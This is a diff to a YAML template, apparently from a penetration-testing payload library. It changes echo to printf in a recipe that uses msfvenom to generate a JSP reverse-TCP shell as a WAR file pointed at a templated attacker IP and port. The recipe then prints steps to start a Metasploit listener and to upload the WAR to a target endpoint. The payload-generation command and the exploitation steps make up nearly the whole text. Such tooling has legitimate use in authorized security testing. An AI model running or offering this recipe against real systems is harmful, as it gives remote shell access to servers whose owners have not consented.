@@ -6,12 +6,13 @@ metadata:
   authors: ["Unknown"]
 
 content: |
-  mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
+  mkdir -p packstation/outbound; \
+  printf '%s\n' 'msfvenom creates the payload. Please wait...'; \
   msfvenom -p java/jsp_shell_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f war > packstation/outbound/revshell.war
-  echo '================================================================'; \
-  echo '                      ------Listener------                      '; \
-  echo '1. Start listener: {{ include('scripts/listener-msf-multi-handler-linux-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
-  echo '================================================================'; \
-  echo '                      ------Exploitation------                      '; \
-  echo '2. Upload WAR file and visit endpoint'; \
-  echo '================================================================';
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------Listener------                      '; \
+  printf '%s\n' '1. Start listener: {{ include('scripts/listener-msf-multi-handler-linux-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------Exploitation------                      '; \
+  printf '%s\n' '2. Upload WAR file and visit endpoint'; \
+  printf '%s\n' '================================================================';
